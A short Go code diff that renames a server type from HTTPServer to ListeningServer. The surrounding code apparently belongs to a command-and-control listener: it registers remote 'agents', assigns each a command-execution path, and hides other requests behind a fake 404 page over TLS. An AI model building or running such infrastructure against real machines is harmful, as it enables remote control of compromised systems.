@@ -83,7 +83,7 @@ func RecvCmdSingle(w http.ResponseWriter, r *http.Request) {
 
 }
 
-func (handler *HTTPServer) ProcessRequest(c *gin.Context) {
+func (handler *ListeningServer) ProcessRequest(c *gin.Context) {
 
 	body, err := io.ReadAll(c.Request.Body)
 	if err != nil {
@@ -104,7 +104,7 @@ func (handler *HTTPServer) ProcessRequest(c *gin.Context) {
 	log.Printf("[+] Registered New Agent at [%s], Recv Cmd Exec Path: %s\n", time.DateTime, newRecvPath)
 
 }
-func (handler *HTTPServer) DenyRequest(c *gin.Context) {
+func (handler *ListeningServer) DenyRequest(c *gin.Context) {
 	c.Writer.WriteHeader(http.StatusNotFound)
 	html, err := os.ReadFile("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\ListeningServer\\NotFound.html")
 	if err != nil {
@@ -150,7 +150,7 @@ func UpdateHttpServer(Server *http.Server, ClientCertFilePath string) *http.Serv
 	Server = &http.Server{Addr: ":443", TLSConfig: TlsConfig}
 	return Server
 }
-func (handler *HTTPServer) init() {
+func (handler *ListeningServer) init() {
 	for {
 		handler.Config.Secure = false
 		fmt.Println("[+] Please give me Port to Start Listening Server: i.e. :443")
@@ -189,7 +189,7 @@ func (handler *HTTPServer) init() {
 
 }
 
-func (handler *HTTPServer) Start() {
+func (handler *ListeningServer) Start() {
 
 	handler.init()
 	handler.GinEngine = gin.Default()
